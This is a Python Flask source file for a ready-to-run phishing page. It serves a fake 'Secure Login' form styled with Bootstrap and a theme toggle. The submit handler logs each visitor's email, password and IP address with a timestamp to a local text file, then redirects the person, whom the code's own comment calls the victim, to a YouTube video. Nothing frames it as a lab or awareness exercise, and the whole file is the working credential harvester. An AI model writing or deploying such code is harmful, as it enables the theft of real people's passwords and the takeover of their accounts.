from flask import Flask, request, redirect, render_template_string
import socket
from datetime import datetime

app = Flask(__name__)


REDIRECT_URL = "https://www.youtube.com/watch?v=FPcsJTxnaBQ&ab_channel=Cinnamin"


DATA_FILE = "captured_data.txt"

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Secure Login</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet" />
  <style>
    body {
      margin: 0;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      font-family: 'Segoe UI', sans-serif;
      transition: background 0.5s, color 0.5s;
    }

    .login-container {
      border-radius: 16px;
      padding: 30px;
      width: 100%;
      max-width: 400px;
      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
      transition: background 0.5s, color 0.5s;
    }

    .form-control {
      border: none;
    }

    .form-control::placeholder {
      color: #aaa;
    }

    .btn-login {
      width: 100%;
      background-color: #0d6efd;
      border: none;
    }

    .btn-login:hover {
      background-color: #0b5ed7;
    }

    .theme-toggle {
      position: absolute;
      top: 20px;
      right: 20px;
      cursor: pointer;
    }


    .toggle {
      width: 60px;
      height: 30px;
      background: #222;
      border-radius: 50px;
      padding: 5px;
      display: flex;
      align-items: center;
      justify-content: space-between;
      position: relative;
      transition: background 0.3s;
    }

    .toggle span {
      width: 20px;
      height: 20px;
      background: #fff;
      border-radius: 50%;
      position: absolute;
      top: 5px;
      left: 5px;
      transition: left 0.3s;
    }

    .toggle.active {
      background: #ddd;
    }

    .toggle.active span {
      left: 35px;
      background: #000;
    }


    body.light {
      background: #f8f9fa;
      color: #000;
    }

    body.light .login-container {
      background: #fff;
      color: #000;
    }

    body.dark {
      background: #000;
      color: #fff;
    }

    body.dark .login-container {
      background: #111;
      color: #fff;
    }

    body.dark .form-control {
      background: #222;
      color: #fff;
    }

    body.dark .form-control::placeholder {
      color: #aaa;
    }

    body.dark .form-control:focus {
      background: #333;
      color: #fff;
    }
  </style>
</head>
<body class="light">
  <div class="theme-toggle">
    <div class="toggle" onclick="toggleTheme()" id="themeBtn">
      <span></span>
    </div>
  </div>

  <div class="login-container">
    <div class="login-header text-center mb-3">
      <h2>Secure Login</h2>
      <p>Please enter your credentials</p>
    </div>
    <form method="POST" action="/submit">
      <div class="mb-3">
        <label for="email" class="form-label">Email address</label>
        <input type="email" class="form-control" id="email" name="email" required placeholder="you@example.com" />
      </div>
      <div class="mb-3">
        <label for="password" class="form-label">Password</label>
        <input type="password" class="form-control" id="password" name="password" required placeholder="••••••••" />
      </div>
      <button type="submit" class="btn btn-login btn-primary">Login</button>
    </form>
  </div>

  <script>
    function toggleTheme() {
      const body = document.body;
      const toggleBtn = document.getElementById('themeBtn');
      body.classList.toggle('dark');
      body.classList.toggle('light');
      toggleBtn.classList.toggle('active');
    }
  </script>
</body>
</html>
"""



def log_captured_data(email, password, ip_address):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(DATA_FILE, "a") as file:
        file.write(f"Timestamp: {timestamp}\n")
        file.write(f"Email: {email}\n")
        file.write(f"Password: {password}\n")
        file.write(f"IP Address: {ip_address}\n")
        file.write("-" * 40 + "\n")

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/submit', methods=['POST'])
def submit():
    email = request.form.get('email')
    password = request.form.get('password')
    ip_address = request.remote_addr

    # Log the captured data to a file
    log_captured_data(email, password, ip_address)

    # Redirect the victim to the legitimate website
    return redirect(REDIRECT_URL, code=302)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
